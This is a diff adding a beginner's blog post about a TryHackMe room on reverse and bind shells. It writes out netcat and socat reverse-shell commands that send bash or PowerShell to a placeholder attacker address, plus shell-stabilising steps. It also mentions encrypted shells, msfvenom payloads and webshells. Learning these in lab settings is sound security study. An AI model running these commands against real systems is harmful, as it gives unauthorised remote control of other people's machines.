@@ -1,0 +1,45 @@
+---
+layout: post
+title: "30 Days of THM: Day 7"
+date: 2024-06-18 10:00:00 +0000
+categories: [post, hacking]
+tags: [post, hacking]
+---
+
+30 Days of TryHackMe: Day 7 — What the Shell?
+
+Welcome to 30 Days of TryHackMe, where I try to build a cybersecurity learning streak through the online hacking platform TryHackMe. Today we are continuing where we left off on the Complete Beginner track. The next section is Shell and Privilege Escalation. Today, I am going to be doing a room at a time, instead of trying to complete an entire section, because that actually did throw me off track for this streak.
+
+
+A shell is a command line environment. In Linux, it is Bash, which stands four Bourne-Again Shell. In Windows, it is cmd.exe or PowerShell. When attacking a vulnerable application, if we can force commands to be run on the target, we can gain access by getting a shell on the target. There are two types of these shells, reverse shells and bind shells. Reverse shells are when we send command line access back to us, and bind shells are when we connect to an open port on the target.
+
+There are many ways of obtaining a shell on the target. Netcat is a network testing tool that is the traditional method, because it is installed by default on Linux. Socat is a more stable and more powerful version of netcat, but it is rarely installed by default. And as covered in the previous section, metasploit and msfvenon can also be used.
+
+Between reverse shells and bind shells, reverse shells are easier to execute and in CTF environments, will mostly be used. The syntax for a reverse shell would be something like:
+Attacking box: nc -nlvp 4444
+
+This is the command you would run. Nc is for netcat, -n restricts to just numeric IPs, -l is so that it is listening for an incoming connection, -v is verbose, and -p is to specify the port. In the case above, 4444 would be the port number.
+
+On the target box, the syntax would be: nc <IP Address> 4444 -e /bin/bash
+
+This would set up a non-interactive shell. A non-interactive is pretty unstable and lacks a lot anything that requires interactivity.
+
+The first step after getting a non-interactive shell would be to try to improve it, perhaps make it interactive. There are severals way to do this. The first way is to use Python. First thing to do is use this python command: python -c ‘import pty;pty.spawn(“/bin/bash”)’ Then you type export TERM=xterm. This gives access to commands like clear. And then you background the shell using ctrl+z, then in your own terminal you type in stty raw -echo; fg.
+
+The second method is to use rlwrap before your nc command, which will give access to history, tab complete, and arrow keys. This is useful against windows targets.
+
+The third method is to use the netcat to try to setup a socat.
+
+The syntax for socat is harder than netcat. For a basic reverse shell, you would type in socat TCP-L:<port> -. The syntax on the target depends on the operating system of the target. On Windows, it would be socat TCP:<LOCAL IP>:<LOCAL PORT> EXEC:powershell.exe,pipes. On Linux, it would be socat TCP:<LOCAL IP>:<LOCAL PORT> EXEC:”bash -li”.
+
+Socat is capable of creating an encrypted shell, which is very useful if you don’t want anyone knowing what you’re doing. If you want to do this, you first need to use opennsl to create a certificate.
+
+Creating payloads can be done through the msfvenom command, which was covered in the previous section. There are two kinds of payloads: staged and stageless. Staged payloads are sent in two parts. Stageless is a self contained piece of code. Staged are less common, and stageless are usually easier to execute, but stageless is also easier to detect and remove.
+
+In the metasploit framework, the typical module for catching shells is multi/handler, and this is what you would use if you want to start a meterpreter shell.
+
+There are also webshells, which are opportunities for code to be uploaded to a web application that will start a shell.
+
+And then this room gives an opportunity to practice with all the different techniques gone over, on both a Linux and a Windows machine.
+
+
